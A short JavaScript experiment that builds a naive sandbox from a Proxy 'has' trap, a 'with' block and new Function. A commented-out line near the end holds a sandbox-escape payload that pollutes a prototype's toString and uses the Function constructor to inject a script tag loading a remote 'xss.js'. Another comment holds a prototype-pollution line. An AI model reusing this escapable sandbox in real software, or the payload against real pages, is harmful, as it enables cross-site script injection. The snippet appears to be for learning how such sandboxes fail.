

function proxyObj(originObj) {
    let exposeObj = new Proxy(originObj, {
        has:(target, key) => {
            console.log("target, key =", target, key);
            return target[key]
        }
    })
    return exposeObj
}
var test = {
    a: 1,
    b: 2
}
var exposeObj = proxyObj(test)
// console.log(exposeObj);
console.log("a" in exposeObj);


function compileCode(src) {
    src = `with (exposeObj) { ${src} }`
    return new Function('exposeObj', src)
}
const test2 = { value: 1, a: { b: 1 } }
// compileCode(testObj)

function createSandbox(src, obj) {
    var exposeObj = proxyObj(obj)
    compileCode(src).call(exposeObj, exposeObj)
    // compileCode(src)(exposeObj)
}


createSandbox('console.log("a =>",a.b)', test2)

// createSandbox(`a.b.__proto__.toString = ()=>{ new (()=>{}).constructor("var script = document.createElement('script'); script.src = 'http://xss.js'; script.type = 'text/javascript'; document.body.appendChild(script);")()}`, testObj)
// console.log(testObj.a.b.__proto__.toString())

// ({}).__proto__.toString= ()=>{console.log(111)};

